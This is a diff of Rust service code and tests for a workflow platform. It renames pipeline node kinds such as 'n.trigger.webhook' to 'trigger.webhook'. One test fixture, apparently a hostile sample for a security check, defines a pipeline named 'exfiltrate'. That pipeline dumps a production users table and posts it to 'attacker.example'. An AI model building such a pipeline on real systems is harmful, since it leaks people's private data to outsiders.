@@ -5131,7 +5131,7 @@ impl HubService {
         let mut seen = BTreeSet::new();
         seen.insert(pipeline_repo_rel);
         for node in &document.spec.nodes {
-            if node.kind != "n.web.response" {
+            if node.kind != "web.response.send" {
                 continue;
             }
             let Some(template_rel) = node.config.get("template").and_then(Value::as_str) else {
@@ -8067,7 +8067,7 @@ fn infer_pipeline_meta(source: &str, install_rel: &str) -> (String, String) {
         .iter()
         .find_map(|node| {
             node.kind
-                .strip_prefix("n.trigger.")
+                .strip_prefix("trigger.")
                 .map(ToString::to_string)
         })
         .unwrap_or_else(|| "webhook".to_string());
@@ -8334,7 +8334,7 @@ mod tests {
                 "modules": {
                     "core": { "path": "wasm/core.wasm", "abi": "zebflow-wasm-json-v1" }
                 },
-                "nodes": [wasm_node_entry("n.x.localpkg.train", "Train", "e2e_train")]
+                "nodes": [wasm_node_entry("x.localpkg.train", "Train", "e2e_train")]
             }
         })
         .to_string();
@@ -8381,7 +8381,7 @@ mod tests {
 
         let installed = platform
             .node_registry
-            .get_by_kind(owner, project, "n.x.localpkg.train")
+            .get_by_kind(owner, project, "x.localpkg.train")
             .expect("the node is installed");
         assert_eq!(
             installed.manifest.source,
@@ -8450,7 +8450,7 @@ mod tests {
                     "core": { "path": "wasm/core.wasm", "abi": "zebflow-wasm-json-v1" }
                 },
                 "nodes": [wasm_node_entry(
-                    &format!("n.x.{package_id}.train"),
+                    &format!("x.{package_id}.train"),
                     "Train",
                     "e2e_train"
                 )]
@@ -8728,7 +8728,7 @@ mod tests {
         assert_eq!(
             platform
                 .node_registry
-                .get_by_kind(owner, project, "n.x.storepkg.train")
+                .get_by_kind(owner, project, "x.storepkg.train")
                 .expect("the node is installed")
                 .manifest
                 .source,
@@ -8790,7 +8790,7 @@ mod tests {
         assert!(
             platform
                 .node_registry
-                .get_by_kind(owner, project, "n.x.filepkg.train")
+                .get_by_kind(owner, project, "x.filepkg.train")
                 .is_some()
         );
     }
@@ -8868,11 +8868,11 @@ mod tests {
         "metadata": { "name": "exfiltrate" },
         "spec": {
             "nodes": [
-                { "id": "t1", "kind": "n.trigger.webhook",
+                { "id": "t1", "kind": "trigger.webhook",
                   "config": { "path": "/public/exfiltrate", "method": "POST" } },
                 { "id": "n1", "kind": "n.db.query",
                   "config": { "credential": "prod-postgres", "query": "select * from users" } },
-                { "id": "n2", "kind": "n.http.request",
+                { "id": "n2", "kind": "http.response.fetch",
                   "config": { "url": "https://attacker.example/collect" } }
             ]
         }
@@ -9130,7 +9130,7 @@ mod tests {
                 "description": "A bundle whose function pipeline travels with it.",
                 "functions": { "main": "functions/main.zf.json" },
                 "nodes": [{
-                    "kind": "n.x.acme.sync",
+                    "kind": "x.acme.sync",
                     "title": "Sync",
                     "description": "Push a payload somewhere.",
                     "run": { "function": "main" },
@@ -9499,7 +9499,7 @@ mod tests {
         assert!(
             platform
                 .node_registry
-                .get_by_kind("superadmin", "default", &format!("n.x.{package_id}.train"))
+                .get_by_kind("superadmin", "default", &format!("x.{package_id}.train"))
                 .is_some(),
             "the previously installed node still resolves"
         );
@@ -9624,7 +9624,7 @@ mod tests {
 
         let module =
             include_bytes!("../../../tests/fixtures/contracts/node-bundle/two-exports.wasm");
-        let mut trigger = wasm_node_entry("n.x.wasmtrig.inbox", "Inbox", "e2e_train");
+        let mut trigger = wasm_node_entry("x.wasmtrig.inbox", "Inbox", "e2e_train");
         trigger["trigger"] = serde_json::json!({
             "type": "webhook",
             "path_template": "/wasmtrig/{{ hook_key }}"
@@ -9698,7 +9698,7 @@ mod tests {
 
         let installed = platform
             .node_registry
-            .get_by_kind(owner, project, "n.x.wasmtrig.inbox")
+            .get_by_kind(owner, project, "x.wasmtrig.inbox")
             .expect("trigger is installed");
         assert!(
             installed.manifest.trigger.is_some(),
@@ -9714,7 +9714,7 @@ mod tests {
         // export is what actually processes the inbound event.
         let (module_spec, export) = installed.manifest.wasm_target().expect("wasm target");
         let output = crate::pipeline::engines::wasm_host::run_wasm_export(
-            "n.x.wasmtrig.inbox",
+            "x.wasmtrig.inbox",
             &installed.package_dir,
             module_spec,
             export,
@@ -9769,8 +9769,8 @@ mod tests {
                     "core": { "path": "wasm/core.wasm", "abi": "zebflow-wasm-json-v1" }
                 },
                 "nodes": [
-                    wasm_node_entry("n.x.e2ewasm.train", "E2E Train", "e2e_train"),
-                    wasm_node_entry("n.x.e2ewasm.score", "E2E Score", "e2e_score")
+                    wasm_node_entry("x.e2ewasm.train", "E2E Train", "e2e_train"),
+                    wasm_node_entry("x.e2ewasm.score", "E2E Score", "e2e_score")
                 ]
             }
         })
@@ -9828,8 +9828,8 @@ mod tests {
 
         // Each node resolves its own export from the shared module.
         for (kind, export) in [
-            ("n.x.e2ewasm.train", "e2e_train"),
-            ("n.x.e2ewasm.score", "e2e_score"),
+            ("x.e2ewasm.train", "e2e_train"),
+            ("x.e2ewasm.score", "e2e_score"),
         ] {
             let installed = platform
                 .node_registry
@@ -9956,7 +9956,7 @@ mod tests {
         // the slug, metadata name, and kind namespace must move together.
         let definition =
             include_str!("../../pipeline/nodes/bundled/openai-embedding/definition.json")
-                .replace("n.ai.embedding", "n.x.openai_embedding_test.embed")
+                .replace("ai.embedding.generate", "x.openai_embedding_test.embed")
                 .replace("\"openai-embedding\"", "\"openai-embedding-test\"");
         let function =
             include_str!("../../pipeline/nodes/bundled/openai-embedding/functions/embed.zf.json");
@@ -10025,14 +10025,14 @@ mod tests {
                 .node_registry
                 .merged_definitions(owner, project)
                 .iter()
-                .any(|definition| definition.kind == "n.x.openai_embedding_test.embed")
+                .any(|definition| definition.kind == "x.openai_embedding_test.embed")
         );
         let lock = platform.dependency_lock.read(owner, project).unwrap();
         let bundle = lock
             .nodes
             .bundles
             .values()
-            .find(|bundle| bundle.definitions == ["n.x.openai_embedding_test.embed"])
+            .find(|bundle| bundle.definitions == ["x.openai_embedding_test.embed"])
             .unwrap();
         assert_eq!(
             bundle.source,
@@ -11476,7 +11476,7 @@ mod tests {
   "description":"The blog feed.",
   "entry_nodes":["trigger_webhook"],
   "nodes":[
-    {"id":"trigger_webhook","kind":"n.trigger.webhook","input_pins":[],"output_pins":["out"],"config":{"path":"/feed","method":"GET"}}
+    {"id":"trigger_webhook","kind":"trigger.webhook","input_pins":[],"output_pins":["out"],"config":{"path":"/feed","method":"GET"}}
   ],
   "edges":[]}
 }"#;
@@ -11852,9 +11852,9 @@ mod tests {
                         "id": "feed",
                         "entry_nodes": ["wh"],
                         "nodes": [
-                            {"id": "wh", "kind": "n.trigger.webhook", "input_pins": [],
+                            {"id": "wh", "kind": "trigger.webhook", "input_pins": [],
                              "output_pins": ["out"], "config": {"path": "/feed", "method": "GET"}},
-                            {"id": "res", "kind": "n.web.response", "input_pins": ["in"],
+                            {"id": "res", "kind": "web.response.send", "input_pins": ["in"],
                              "output_pins": ["out"], "config": {"template": "pages/feed.tsx"}}
                         ],
                         "edges": [{"from_node": "wh", "from_pin": "out",
@@ -12265,8 +12265,8 @@ mod tests {
             "src/hub/demo/schemas/sekejap/schema.json"
         );
         assert_eq!(
-            placement.destination("nodes/n.x.acme.thing.json"),
-            "src/hub/demo/nodes/n.x.acme.thing.json"
+            placement.destination("nodes/x.acme.thing.json"),
+            "src/hub/demo/nodes/x.acme.thing.json"
         );
         assert_eq!(
             placement.destination("zebflow.yaml"),
